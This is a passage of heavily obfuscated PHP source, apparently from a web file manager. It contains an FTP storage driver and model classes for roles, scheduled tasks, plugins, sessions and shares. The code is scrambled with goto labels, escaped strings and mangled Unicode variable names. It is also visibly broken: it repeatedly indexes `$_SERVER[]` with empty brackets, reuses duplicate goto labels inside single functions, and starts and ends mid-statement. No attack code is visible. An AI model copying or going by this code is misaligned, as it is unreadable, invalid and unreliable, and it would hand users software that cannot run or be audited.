$this->{$bḂ} = $fᆞ; } return !0; } $aη = parse_url(trim($this->server, $B[8])); $this->host = $aη[$B[175]]; goto Fբ; Fբ: $Fɲ = isset($aη[$B[174]]) && $aη[$B[174]] == $B[1251] ? !0 : !1; $this->scheme = $Fɲ ? $B[1252] : $B[1253]; $this->port = isset($aη[$B[176]]) ? $aη[$B[176]] : 21; goto b֕ӈ; cԚ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $B刨 = $this->pasv == $B[87] ? !0 : !1; @ftp_pasv($this->connect, $B刨); goto A˗; F囮: $B =& $_SERVER[]; static $Eʕ = array(); $Cض = md5(json_encode($D͑)); goto E摕; b֕ӈ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $E = @ftp_login($this->connect, $this->username, $this->userpass); goto cԚ; aÞ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($cذ, $E󃍉ڨ = '', $dˣ = REPEAT_RENAME) { if ($this->setContent($cذ, $E󃍉ڨ)) { return $this->getPathOuter($cذ); } return !1; } public function mkdir($dؤ, $E = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $dؤ = $this->iconvSystem($dؤ); if ($this->_isFolder($dؤ) || @ftp_mkdir($this->connect, $dؤ)) { return $this->getPathOuter($dؤ); } if (!$this->mkdir($this->pathFather($dؤ))) { return !1; } if ($dؤ = @ftp_mkdir($this->connect, $dؤ)) { return $this->getPathOuter($dؤ); } return !1; } public function copyFile($Cú, $Cٔ) { goto e򰷟; aϹ御: $this->tempFileRemve($B); return $e; goto aʯͺʞ; dი: $Dӹ = $this->iconvApp($B); $this->download($Cú, $Dӹ); $e = $this->upload($Cٔ, $Dӹ); goto aϹ御; e򰷟: if (!$this->_isconn()) { return !1; } $eט = $this->pathThis($this->iconvSystem($Cú)); $B = $this->tempFile($eט); goto dი; aʯͺʞ: } public function moveFile($cɈХ, $a͂) { if (!$this->_isconn()) { return !1; } $cɈХ = $this->iconvSystem($cɈХ); $a͂ = $this->iconvSystem($a͂); $f = @ftp_rename($this->connect, $cɈХ, $a͂); return $f ? $this->getPathOuter($a͂) : !1; } public function delFile($bݎ) { if (!$this->_isconn()) { return !1; } $bݎ = $this->iconvSystem($bݎ); return @ftp_delete($this->connect, $bݎ); } public function delFolder($f텋) { goto c򫫶; c: $this->fileList($f텋, $F갆, $cӾҕ, !0); $this->listItemCache = !0; foreach ($cӾҕ as $Aӱ) { $C՞ = $this->iconvSystem($Aӱ[$_SERVER[][28]]); $Bđ = @ftp_delete($this->connect, $C՞); if (!$Bđ) { return !1; } } goto b֦ǹ; b֦ǹ: foreach ($F갆 as $C՞) { $C՞ = $this->iconvSystem($C՞); $Bđ = @ftp_rmdir($this->connect, $C՞); if (!$Bđ) { return !1; } } $f텋 = $this->iconvSystem($f텋); return @ftp_rmdir($this->connect, $f텋); goto e; c򫫶: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $F갆 = $cӾҕ = array(); goto c; e: } public function rename($E͞, $EÚ) { goto BĔ̆; fא䄜: $bЯ = $this->iconvSystem($bЯ); $E͞ = $this->iconvSystem($E͞); $e = $this->pathFather($E͞); goto fݵ; aŕ: return $C ? $this->getPathOuter($c) : !1; goto eȈ; BĔ̆: $Bڴ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $bЯ = $this->fileNameAuto($this->pathFather($E͞), $EÚ); goto fא䄜; fݵ: $c = rtrim($e, $Bڴ[8]) . $Bڴ[8] . $bЯ; $C = @ftp_rename($this->connect, $E͞, $c); $c = $this->iconvApp($c); goto aŕ; eȈ: } private function folderInfo($A, $Aז = false) { $fގ =& $_SERVER[]; $c眄 = array($fގ[28] => $this->pathThis($A), $fގ[76] => $this->getPathOuter($fގ[8] . $A), $fގ[29] => $fގ[77]); if ($Aז) { return $c眄; } $c眄[$fގ[194]] = $c眄[$fގ[84]] = 0; $c眄[$fގ[195]] = $c眄[$fގ[196]] = !0; return $c眄; } private function fileInfo($cì½, $BΒƻ = false, $Dԛ = array()) { goto aɼ; aɼ: $Fᷭ =& $_SERVER[]; $eȡ = array($Fᷭ[28] => $this->pathThis($cì½), $Fᷭ[76] => $this->getPathOuter($Fᷭ[8] . $cì½), $Fᷭ[29] => $Fᷭ[193], $Fᷭ[78] => isset($Dԛ[$Fᷭ[78]]) ? $Dԛ[$Fᷭ[78]] : 0, $Fᷭ[168] => $this->ext($cì½)); if ($BΒƻ) { return $eȡ; } goto Eɻ; Eɻ: $eȡ[$Fᷭ[194]] = $eȡ[$Fᷭ[84]] = 0; $eȡ[$Fᷭ[195]] = $eȡ[$Fᷭ[196]] = !0; $D̈́ = $this->iconvSystem($cì½); goto EĈݏ; EĈݏ: $eȡ[$Fᷭ[84]] = @ftp_mdtm($this->connect, $D̈́); if (empty($Dԛ)) { $Dԛ = $this->objectMeta($cì½); if (!$Dԛ) { return $eȡ; } } $eȡ[$Fᷭ[78]] = $Dԛ[$Fᷭ[78]]; goto Dև; Dև: return $eȡ; goto FӠԛ; FӠԛ: } public function size($D) { $AΆ˞ = $this->objectMeta($D); return $AΆ˞ ? $AΆ˞[$_SERVER[][78]] : 0; } public function info($eא) { if ($this->isFile($eא)) { return $this->fileInfo($eא, 0); } else { if ($this->isFolder($eא)) { return $this->folderInfo($eא); } } return !1; } private function fileList($dϡ, &$a՞, &$EԆđ, $a = false) { goto Dӂ; a: $Aˣ = array($EǬߦ[95] => 1, $EǬߦ[1255] => 1); foreach ($Bڟ as $cʸ) { goto d݅; d݅: $f = $this->_listItem($cʸ); if ($f[0] == $EǬߦ[724]) { continue; } $f = $f[8]; goto cΖ; dٓ̉: if ($e޻) { $a՞[] = $f; if ($a) { $this->fileList($f, $a՞, $EԆđ, $a); } continue; } $EԆđ[] = $f򊑌; goto eӥ; D: if (substr($cʸ, 0, 1) == $EǬߦ[1256]) { $f򊑌[$EǬߦ[29]] = $EǬߦ[77]; $f򊑌[$EǬߦ[78]] = 0; } $e޻ = $f򊑌[$EǬߦ[29]] == $EǬߦ[77] ? !0 : !1; if ($f) { $this->cacheMethod($EǬߦ[199], $f, $e޻); $this->cacheMethod($EǬߦ[200], $f, $f򊑌); } goto dٓ̉; cΖ: if (empty($f) && $f !== $EǬߦ[191] || isset($Aˣ[$f])) { continue; } $f = $this->iconvApp($dϡ . ltrim($f, $EǬߦ[8])); $f򊑌 = array($EǬߦ[28] => $f, $EǬߦ[29] => $EǬߦ[193], $EǬߦ[78] => $f[4]); goto D; eӥ: } if ($f) { $this->cacheMethod($EǬߦ[199], $dϡ, !0); } goto c޶; Dӂ: $EǬߦ =& $_SERVER[]; $dϡ = $this->iconvSystem($dϡ); if (!$this->isFolder($dϡ)) { return !1; } goto D; Aԃ: $f = $this->listItemCache === !1 ? !1 : !0; $Bڟ = @ftp_rawlist($this->connect, $dϡ); if (!$Bڟ) { $Bڟ = array(); } goto a; D: @ftp_chdir($this->connect, $EǬߦ[8]); $dϡ = rtrim($dϡ, $EǬߦ[8]) . $EǬߦ[8]; check_abort(); goto Aԃ; c޶: } private function _listItem($bܶꅅ) { if (empty($bܶꅅ)) { return array(); } $f﨨 = preg_split($_SERVER[][1257], $bܶꅅ); if (count($f﨨) <= 9) { return $f﨨; } $f﨨[8] = trim(substr($bܶꅅ, strpos($bܶꅅ, $f﨨[7]) + strlen($f﨨[7]))); return array_splice($f﨨, 0, 9); } public function listPath($F, $Fՙ = false) { goto f; B֡: $this->fileList($F, $A, $eφ򒭱); foreach ($A as $Aڶ => $dҎИ) { $A[$Aڶ] = $this->folderInfo($dҎИ, $Fՙ); } foreach ($eφ򒭱 as $Aڶ => $dҎИ) { $eφ򒭱[$Aڶ] = $this->fileInfo($dҎИ[$d[28]], $Fՙ, $dҎИ); } goto f⅗; f: $d =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $A = $eφ򒭱 = array(); goto B֡; f⅗: return array($d[75] => $A, $d[74] => $eφ򒭱); goto eߕ; eߕ: } public function has($B厂, $Dڼ = false, $eם = true) { goto eʞ; A凜: $this->fileList($B厂, $e, $dݾ, $Aٍ); if ($Dڼ) { return array($A¶ʺ[203] => count($dݾ), $A¶ʺ[204] => count($e)); } if ($eם) { if (count($dݾ)) { return !0; } } else { if (count($e)) { return !0; } } goto D寋; D寋: return !1; goto f鲘; eʞ: $A¶ʺ =& $_SERVER[]; $e = $dݾ = array(); $Aٍ = $Dڼ ? !0 : !1; goto A凜; f鲘: } public function listAll($eҝ) { goto dȭ; F㬷: $this->fileList($eҝ, $B򴩜, $b΃׉, !0); $dт = array(); foreach ($b΃׉ as $BӐ) { $dт[$BӐ[$dχ[28]]] = $BӐ[$dχ[78]]; } goto eם; dȭ: $dχ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $B򴩜 = $b΃׉ = array(); goto F㬷; eם: foreach ($B򴩜 as $BӐ) { if (is_string($BӐ)) { $dт[$BӐ] = 0; } } return $this->listAllFiles($eҝ, array_keys($dт), $dт); goto c; c: } public function getContent($dĶﲋ) { if (!$this->_isconn()) { return !1; } $dĶﲋ = $this->iconvSystem($dĶﲋ); return $this->fileSubstr($dĶﲋ); } public function setContent($F, $AĸΕ = '') { goto a; a: if (!$this->_isconn()) { return !1; } $f牏 = $this->pathThis($this->iconvSystem($F)); $BԨ᪑ = $this->tempFile($f牏); goto e; e: file_put_contents($BԨ᪑, $AĸΕ); $B􃳄 = $this->upload($F, $this->iconvApp($BԨ᪑)); $this->tempFileRemve($BԨ᪑); goto dջ; dջ: return $B􃳄; goto a; a: } public function fileSubstr($c, $a = 0, $d뎼 = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($c, $a, $d뎼); } private function ftpRequest($A, $e惙 = 0, $D = false) { goto a; aֱ: curl_setopt($Eݸ, CURLOPT_URL, $F . $this->pathEncode($A)); curl_setopt($Eݸ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($D) { $e𛄍 = $e惙 + $D - 1; curl_setopt($Eݸ, CURLOPT_RANGE, "{$e惙}\x2d{$e𛄍}"); } goto B; a: $A = $this->iconvSystem($A); $F = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $Eݸ = curl_init(); goto aֱ; C: return $F; goto B; B: curl_setopt($Eݸ, CURLOPT_RETURNTRANSFER, 1); $F = curl_exec($Eݸ); curl_close($Eݸ); goto C; B: } public function upload($D, $b, $dްȆ = false, $F慲 = REPEAT_REPLACE) { goto fݛɿ; fݛɿ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($D))) { return !1; } $D = $this->iconvSystem($D); goto Eϕٹ; AՄ: if ($Eƛ != FTP_FINISHED) { return !1; } return $this->getPathOuter($D); goto Eվ; Eϕٹ: $b = $this->iconvSystem($b); $Eƛ = ftp_nb_put($this->connect, $D, $b, FTP_BINARY); while ($Eƛ == FTP_MOREDATA) { $Eƛ = ftp_nb_continue($this->connect); } goto AՄ; Eվ: } public function download($CӉ֭, $e = '') { goto cۚ; cۚ: if (!$this->_isconn()) { return !1; } $e㉑ = $this->pathFather($e); if (!IO::mkdir($e㉑)) { return !1; } goto fċ; e: while ($EΖ == FTP_MOREDATA) { $EΖ = ftp_nb_continue($this->connect); } if ($EΖ != FTP_FINISHED) { return !1; } return $this->iconvApp($e); goto fϏ΢; fċ: $CӉ֭ = $this->iconvSystem($CӉ֭); $e = $this->iconvSystem($e); $EΖ = ftp_nb_get($this->connect, $e, $CӉ֭, FTP_BINARY); goto e; fϏ΢: } public function exist($cڂ) { return $this->isFile($cڂ) || $this->isFolder($cڂ); } public function isFile($EϦ䫉) { return !$this->isFolder($EϦ䫉) && $this->objectMeta($EϦ䫉); } public function isFolder($f) { return $this->cacheMethod($_SERVER[][199], $f); } protected function objectMeta($aݼ) { return $this->cacheMethod($_SERVER[][200], $aݼ); } protected function _objectMeta($b֑) { goto bܥ; bܥ: $Bޱ =& $_SERVER[]; if ($b֑ == $Bޱ[33] || $b֑ == $Bޱ[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto c; a章: $C = @ftp_size($this->connect, $b֑); if ($C != -1) { $Aꮊԑ[$Bޱ[78]] = $C; } else { $D = @ftp_chdir($this->connect, $b֑); if (!$D) { return !1; } $Aꮊԑ[$Bޱ[29]] = $Bޱ[77]; } return $Aꮊԑ; goto D; c: $b֑ = $this->iconvSystem($b֑); $Aꮊԑ = array($Bޱ[28] => $this->iconvApp($b֑), $Bޱ[29] => $Bޱ[193], $Bޱ[78] => 0); @ftp_chdir($this->connect, $Bޱ[8]); goto a章; D: } protected function _isFolder($DƑ) { $A돡ߒ =& $_SERVER[]; if ($DƑ == $A돡ߒ[33] || $DƑ == $A돡ߒ[8]) { return !0; } $ȀŘ = $this->_objectMeta($DƑ); return isset($ȀŘ[$A돡ߒ[29]]) && $ȀŘ[$A돡ߒ[29]] == $A돡ߒ[77] ? !0 : !1; } } goto CĲ׍; b: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\162\157\x6c\x65\x4c\151\163\x74"; public $field = array("\156\141\155\145", "\141\165\x74\x68", "\x6c\141\x62\145\154", "\x64\151\163\160\154\x61\171", "\x73\x79\163\x74\x65\155", "\x64\x65\x73\143", "\151\x67\156\157\x72\145\x45\170\164", "\151\x67\x6e\157\162\x65\x46\151\x6c\145\123\151\172\145", "\x61\144\x6d\151\156\x69\163\164\162\141\164\x6f\x72", "\163\157\162\164"); public function listData($E櫃 = false, $A = "\x73\x6f\162\164", $BŪ = false) { $bܺҟ =& $_SERVER[]; $a٥ = parent::listData($E櫃, $A, $BŪ); if (!$E櫃) { foreach ($a٥ as $cӯ => $D) { if ($D[$bܺҟ[1890]] == 1) { $a٥[$cӯ][$bܺҟ[431]] = LNG($bܺҟ[2116]); } } } return $a٥; } public function update($Cϫ, $bѶЇ) { goto fﵲ; eͳ: if (!$D || $cœ诸 && $cœ诸[$C[393]] != $D[$C[393]]) { return !1; } if ($cœ诸[$C[1890]] == 1) { $bѶЇ = array($C[28] => $bѶЇ[$C[28]], $C[1724] => $bѶЇ[$C[1724]]); } $this->filterAuth($bѶЇ[$C[406]]); goto Dı; fﵲ: $C =& $_SERVER[]; $D = parent::listData($Cϫ); $cœ诸 = $this->findByName($bѶЇ[$C[28]]); goto eͳ; Dı: return parent::update($Cϫ, $bѶЇ); goto bݺ; bݺ: } public function remove($A) { $b҉ = parent::listData($A); if (!$b҉ || $b҉[$_SERVER[][1174]]) { return !1; } return parent::remove($A); } public function add($aʢҏ) { goto f; f: $D̥ =& $_SERVER[]; $c = $aʢҏ[$D̥[28]]; if ($this->findByName($c)) { return !1; } goto C; C: $D͏ = array($D̥[413] => $c, $D̥[1708] => $D̥[33], $D̥[1704] => $D̥[1712], $D̥[2117] => 1, $D̥[1707] => 0, $D̥[2118] => 0, $D̥[1706] => $this->getSort()); $aʢҏ = array_merge($D͏, $aʢҏ); $this->filterAuth($aʢҏ[$D̥[406]]); goto E; E: return parent::insert($aʢҏ); goto cͨ; cͨ: } private function getSort() { $A뽸 =& $_SERVER[]; $C = parent::listData(); $f = array_to_keyvalue($C, $A뽸[33], $A뽸[1725]); return empty($f) ? 0 : max($f) + 1; } private function filterAuth(&$Dů) { $cꭏ =& $_SERVER[]; $dņģ = array(); $E = array_filter(explode($cꭏ[47], $Dů)); foreach ($E as $Dů) { $D = explode($cꭏ[95], $Dů); if ($D[0] == $cꭏ[2119] && $D[1] != $cꭏ[1093]) { $eҷ = $D[0] . $cꭏ[95] . $D[1] . $cꭏ[2120]; if (!in_array($eҷ, $E)) { $dņģ[] = $eҷ; } } $dņģ[] = $Dů; } $Dů = implode($cꭏ[47], $dņģ); } public function sort($dу, $Aғ) { return parent::update($dу, $Aғ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x74\x61\163\153\114\151\x73\x74"; public $field = array("\x6e\141\155\145", "\164\171\160\x65", "\145\x76\145\x6e\164", "\164\x69\x6d\145", "\x64\x65\163\143", "\163\171\x73\x74\x65\155", "\x65\156\x61\142\154\145", "\x6c\141\163\x74\122\165\156", "\x73\x6f\x72\164"); public function listData($e = false, $e = "\163\x6f\162\164", $dފ = false) { return parent::listData($e, $e, $dފ); } public function add($aϢ) { $dɺ =& $_SERVER[]; $F = $this->findByName($aϢ[$dɺ[28]]); if ($F) { return !1; } $aϢ[$dɺ[1497]] = 0; $aϢ[$dɺ[1725]] = $this->getSort(); return parent::insert($aϢ); } private function getSort() { $Fп =& $_SERVER[]; $C̔ = parent::listData(); $B = array_to_keyvalue($C̔, $Fп[33], $Fп[1725]); return empty($B) ? 0 : max($B) + 1; } public function update($cꋘȑ, $E齆) { $d݇ۛ =& $_SERVER[]; $a׿֐ = $this->listData($cꋘȑ); $a뺤 = $this->findByName($E齆[$d݇ۛ[28]]); if (!$a׿֐ || $a뺤 && $a뺤[$d݇ۛ[393]] != $a׿֐[$d݇ۛ[393]]) { return !1; } return parent::update($cꋘȑ, $E齆); } public function remove($F鯃, $b⢎ = false) { $E =& $_SERVER[]; $A = $this->listData($F鯃); if (!$A) { return; } if (!$b⢎ && $A[$E[1174]] == $E[87]) { return !1; } return parent::remove($F鯃); } public function enable($f, $AΉ՗) { return $this->update($f, array($_SERVER[][2111] => $AΉ՗)); } public function run($d캶) { return $this->update($d캶, array($_SERVER[][2121] => time())); } } goto A瘔; AՃ: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x70\x6c\x75\147\151\156\114\151\163\164"; public $field = array("\156\141\155\x65", "\163\164\141\x74\x75\x73", "\x72\x65\147\151\145\163\x74", "\x63\157\156\x66\151\147"); public function loadList($F闰˾ = false) { $DȎ = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($F闰˾) { return $DȎ[$F闰˾]; } return $DȎ; } public function init() { $B߯䥞 =& $_SERVER[]; Hook::trigger($B߯䥞[1813]); $a؋ = $this->loadPluginList(); foreach ($a؋ as $c݌͢ => $aРҿ) { $EÐ = $this->appAllow($c݌͢, $aРҿ); if (!$EÐ) { continue; } foreach ($aРҿ[$B߯䥞[1814]] as $B => $C؜) { Hook::bind($B, $C؜); } } Hook::trigger($B߯䥞[1815]); Hook::trigger(ACTION); } public function appAllow($Dփ, $a, $f = true) { $d  =& $_SERVER[]; $E = PLUGIN_DIR . $Dփ . $d [1816]; if (!is_array($a) || !is_array($a[$d [1814]]) || $a[$d [715]] != 1 || !is_file($E)) { return !1; } if ($GLOBALS[$d [485]] == 1) { return !0; } if ($f && !Action($d [1817])->checkAuth($Dփ)) { return !1; } return !0; } public function unInstall($f񾓸) { $Dݮ =& $_SERVER[]; $aٰ = $this->loadList($f񾓸); if (file_exists(PLUGIN_DIR . $f񾓸)) { Hook::apply($f񾓸 . $Dݮ[1818]); } $this->remove($aٰ[$Dݮ[393]]); } public function changeStatus($f, $fˑڲ) { $D =& $_SERVER[]; $A喵 = $this->loadList($f); if ($fˑڲ) { Hook::apply($f . $D[1819]); } $this->update($A喵[$D[393]], array($D[1820] => $fˑڲ)); } public function appRegist($A⍖, $CԈ) { $A̠ =& $_SERVER[]; $bΥ̉ = $this->loadList($A⍖); if ($bΥ̉) { $this->update($bΥ̉[$A̠[393]], array($A̠[1814] => $CԈ)); } else { $f = array($A̠[28] => $A⍖, $A̠[1814] => $CԈ, $A̠[715] => 0, $A̠[6] => $this->getConfigDefault($A⍖)); $this->insert($f); } } public function getConfigDefault($B) { $aΤ =& $_SERVER[]; $f܇ = array(); $d = $this->getPackageJson($B); if (!$d && is_array($d[$aΤ[1821]])) { return $f܇; } foreach ($d[$aΤ[1821]] as $d => $fÃ) { if (!isset($fÃ[$aΤ[372]]) || isset($f܇[$d])) { continue; } $f܇[$d] = $fÃ[$aΤ[372]]; } return $f܇; } public function getPackageJson($D) { return Hook::apply($D . $_SERVER[][1822]); } public function getConfig($bⓊ֋, $Dێ = false) { $f =& $_SERVER[]; $Eߐܞ = array(); $Eק = $this->loadList($bⓊ֋); if ($Eק && is_array($Eק[$f[6]])) { $Eߐܞ = $Eק[$f[6]]; } if (!$Eߐܞ || $Dێ) { $Eߐܞ = $this->getConfigDefault($bⓊ֋); } return $Eߐܞ; } public function setConfig($E܍, $Bû = false) { goto Cݭ; C: $this->update($f[$bΉ˼[393]], array($bΉ˼[6] => $Fǐ)); goto BǍ; F: $Fǐ = $f[$bΉ˼[6]]; if ($Bû == !1) { $Fǐ = array(); $Bû = $this->getConfigDefault($E܍); } foreach ($Bû as $a => $b) { $Fǐ[$a] = is_string($b) ? trim($b) : $b; } goto C; Cݭ: $bΉ˼ =& $_SERVER[]; $f = $this->loadList($E܍); if (!$f) { return !1; } goto F; BǍ: } public function viewList() { goto Dڻ; Dڻ: $cݿ =& $_SERVER[]; $ěÊ = $this->loadList(); $this->pluginScan($ěÊ); goto Eó; Eó: $ěÊ = $this->loadPluginList(); $dň = array(); foreach ($ěÊ as $C => $Aԗ) { unset($Aԗ[$cݿ[1814]], $Aԗ[$cݿ[6]]); $eÌ = PLUGIN_DIR . $Aԗ[$cݿ[28]] . $cݿ[1816]; if (!is_file($eÌ)) { continue; } $c = Hook::apply($Aԗ[$cݿ[28]] . $cݿ[1822]); if (is_array($c)) { $dň[$C] = array_merge($Aԗ, $c); } } goto DӒɟ; DӒɟ: return $dň; goto E; E: } private function loadPluginList() { $Aŋ =& $_SERVER[]; $Bɻʆֲ = $this->loadList(); if (strtolower(MOD) == $Aŋ[1823]) { return $Bɻʆֲ; } $BΚ = Hook::trigger($Aŋ[1824], $Bɻʆֲ); if ($Bɻʆֲ && !$BΚ) { die; } return $BΚ ? $BΚ : $Bɻʆֲ; } private function pluginScan($F) { $eǐպ =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $eʱ, $d, 0); foreach ($eʱ as $C) { $f۽Ǔ = get_path_this($C); if (isset($F[$f۽Ǔ]) || !file_exists($C . $eǐպ[1825]) || !file_exists($C . $eǐպ[1816])) { continue; } Hook::apply($f۽Ǔ . $eǐպ[1819]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\137\x73\145\x73\163\151\157\156"; public function get($c匸) { $Aط =& $_SERVER[]; $Dڴ = $this->where(array($Aط[1826] => $c匸))->find(); if (!is_array($Dڴ)) { return !1; } return $Dڴ[$Aط[720]]; } public function set($e, $f, $e߄ = 3600) { $F =& $_SERVER[]; $Fɍ = array($F[1826] => $e, $F[1735] => $f, $F[1827] => $e߄ + time()); if (Session::get($F[1828])) { $Fɍ[$F[1533]] = Session::get($F[1828]); } else { $Fɍ[$F[1533]] = 0; } if ($this->get($e)) { return $this->where(array($F[1826] => $e))->save($Fɍ); } else { return $this->add($Fɍ, array(), !0); } } public function remove($A) { return $this->where(array($_SERVER[][1826] => $A))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][1829] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\x72\145"; protected $dataAuto = array(array("\155\x6f\144\151\146\x79\124\151\x6d\x65", "\164\151\155\x65", "\151\x6e\163\145\x72\x74\54\165\160\x64\x61\x74\145", "\146\165\x6e\x63\x74\151\157\x6e"), array("\x63\x72\145\141\x74\x65\x54\151\x6d\145", "\x74\151\x6d\x65", "\x69\156\163\145\x72\164", "\146\165\156\x63\164\x69\x6f\156"), array("\157\160\x74\151\157\156\163", '', "\x69\156\163\x65\x72\164\54\165\160\144\141\164\145\54\x73\145\x6c\x65\143\164", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($E) { $c =& $_SERVER[]; $F۬ = isset($E[0]) ? $E[0] : !1; return array($c[1830] => array(USER_ID, $c[1831]), $c[1774] => array($F۬, $c[1832])); } protected function listSimple() { $d = array($_SERVER[][1533] => USER_ID); $c = $this->field($this->fieldList)->where($d)->select(); return $c ? $c : array(); } protected function getInfo($f罿, $c = false) { $FĪ =& $_SERVER[]; if ($c) { return $this->_getShareInfo(array($FĪ[468] => $f罿)); } $f = $this->cacheFunctionGet($FĪ[1781], $f罿); return $f; } public function getInfoByHash($d۝) { return $this->_getShareInfo(array($_SERVER[][470] => $d۝)); } public function getInfoByPath($A폄) { $Dũ =& $_SERVER[]; $D򈺨 = array($Dũ[1533] => USER_ID, $Dũ[395] => $A폄); return $this->_getShareInfo($D򈺨); } public function getInfoBySourcePath($f܅) { $B =& $_SERVER[]; $Dĵ = array($B[1533] => USER_ID, $B[1072] => $f܅); return $this->_getShareInfo($Dĵ); } private function _getShareInfo($F) { goto eǊ; c͢Ѿ: $F = array($A򶳩[468] => $Cڄ£[$A򶳩[468]]); $cܙ = $A򶳩[1833]; $D = Model($A򶳩[577])->order($A򶳩[393])->field($cܙ)->where($F)->select(); goto Dʋ; eǊ: $A򶳩 =& $_SERVER[]; $Cڄ£ = $this->where($F)->find(); if (!$Cڄ£) { return !1; } goto c͢Ѿ; Dʋ: if ($Cڄ£[$A򶳩[395]] == $A򶳩[191]) { $Cڄ£[$A򶳩[85]] = IO::info($Cڄ£[$A򶳩[1072]]); } else { $Cڄ£[$A򶳩[85]] = Model($A򶳩[1209])->pathInfo($Cڄ£[$A򶳩[395]]); } $Cڄ£[$A򶳩[1834]] = $D; return $Cڄ£; goto A; A: } protected function getInfoAuth($d݅) { $b =& $_SERVER[]; $cǚɣ = $this->getInfo($d݅); $cǚɣ[$b[406]] = Model($b[482])->authMake($cǚɣ[$b[1834]]); return $cǚɣ; } protected function listData($d򎵏 = null, $C࡜ = 300) { $c =& $_SERVER[]; $cϪ = array(array($c[473] => array($c[971], 0), $c[475] => array($c[971], 0), $c[1835] => $c[1789])); if ($d򎵏 == $c[1836]) { $cϪ = array($c[473] => 1); } else { if ($d򎵏 == $c[1057]) { $cϪ = array($c[475] => 1); } } $cϪ[$c[1533]] = USER_ID; $Bž = $this->where($cϪ)->selectPage($C࡜); return $Bž; } protected function listToMe($bٝ = 300) { goto fË昮; EËǓ: if ($b) { $E܂ = array(array($c۶[562] => SourceModel::TYPE_USER, $c۶[484] => USER_ID), array($c۶[562] => SourceModel::TYPE_GROUP, $c۶[484] => array($c۶[7], $b)), $c۶[1835] => $c۶[1789]); } $Fȗ = Model($c۶[577])->where($E܂)->selectPage($bٝ); $B = array_to_keyvalue_group($Fȗ[$c۶[367]], $c۶[468]); goto D҃Ȫ; fË昮: $c۶ =& $_SERVER[]; $b = Model($c۶[1837])->userGroupParents(USER_ID); $E܂ = array($c۶[562] => SourceModel::TYPE_USER, $c۶[484] => USER_ID); goto EËǓ; C藍ɦ: $f췯ĵ = $this->field($A)->where($E܂)->select(); foreach ($f췯ĵ as $cˬ => &$B좙) { $B좙[$c۶[1834]] = $B[$B좙[$c۶[468]]]; } unset($B좙); goto b; b: $A㟿 = array($c۶[1839] => $f췯ĵ, $c۶[1840] => $Fȗ[$c۶[364]]); return $A㟿; goto f܈꓊; D҃Ȫ: if (!$B) { return $Fȗ; } $A = $c۶[1838]; $E܂ = array($c۶[468] => array($c۶[411], array_keys($B)), $c۶[1533] => array($c۶[973], $c۶[191])); goto C藍ɦ; f܈꓊: } protected function shareAdd($Aʐ, $F¾) { $cٳ =& $_SERVER[]; $aëΗ = $this->_addShareData($Aʐ, $F¾); if (!empty($F¾[$cٳ[1841]])) { $this->_shareAuthSet($aëΗ, $F¾[$cٳ[1841]]); } $this->shareEventAdd($Aʐ, $F¾, $cٳ[1060]); return $aëΗ; } protected function shareAddSystem($cޮ, $c) { $c󝶧 =& $_SERVER[]; $b = $this->_addShareData($cޮ, $c, $c󝶧[1174]); $this->_shareAuthSet($b, $c[$c󝶧[1841]]); return $b; } private function shareEventAdd($e, $E㦪, $E = "\x61\x64\x64") { goto Aި; Aި: $fޖ =& $_SERVER[]; if (!$e || $e == $fޖ[191]) { return; } if ($E == $fޖ[1060]) { if ($E㦪[$fޖ[473]] == $fޖ[87]) { Model($fޖ[546])->eventShare($e, $fޖ[1842]); } if ($E㦪[$fޖ[475]] == $fޖ[87]) { Model($fޖ[546])->eventShare($e, $fޖ[1843]); } return; } goto Cϑ; a輚: Model($fޖ[546])->eventShare($e, $c܅ృ); return; goto A˕; bօ襓: if ($A塦Σ[$fޖ[473]] == $fޖ[87] && $E㦪[$fޖ[473]] == $fޖ[191]) { $c܅ృ = $fޖ[1845]; } if ($A塦Σ[$fޖ[475]] == $fޖ[191] && $E㦪[$fޖ[475]] == $fޖ[87]) { $c܅ృ = $fޖ[1843]; } if ($A塦Σ[$fޖ[475]] == $fޖ[87] && $E㦪[$fޖ[475]] == $fޖ[191]) { $c܅ృ = $fޖ[1846]; } goto a輚; Cϑ: $A塦Σ = $this->getInfoByPath($e); $c܅ృ = $fޖ[1844]; if ($A塦Σ[$fޖ[473]] == $fޖ[191] && $E㦪[$fޖ[473]] == $fޖ[87]) { $c܅ృ = $fޖ[1842]; } goto bօ襓; A˕: } private function _addShareData($e, $a = array(), $dԽ = false) { goto C󆝴; C󆝴: $aъ =& $_SERVER[]; $eʥͮ = $dԽ == $aъ[1174] ? 0 : USER_ID; $f㹆Х = array($aъ[410] => $e, $aъ[1524] => $eʥͮ); goto b㐡; b㐡: if ($e == 0) { $f㹆Х = array($aъ[1847] => $a[$aъ[1072]], $aъ[1524] => $eʥͮ); } if ($F = $this->where($f㹆Х)->find()) { return $F[$aъ[468]]; } if ($e == 0) { $b֧ = array($aъ[28] => get_path_this($a[$aъ[76]])); } else { $b֧ = Model($aъ[795])->sourceInfo($e); if (!$b֧) { return !1; } } goto A߽; D: $this->where(array($aъ[467] => $Aԗ))->save($E); return $Aԗ; goto fܐ֨; A߽: if (!$a[$aъ[1436]]) { $a[$aъ[1436]] = $b֧[$aъ[28]]; } $Eٌɺ = 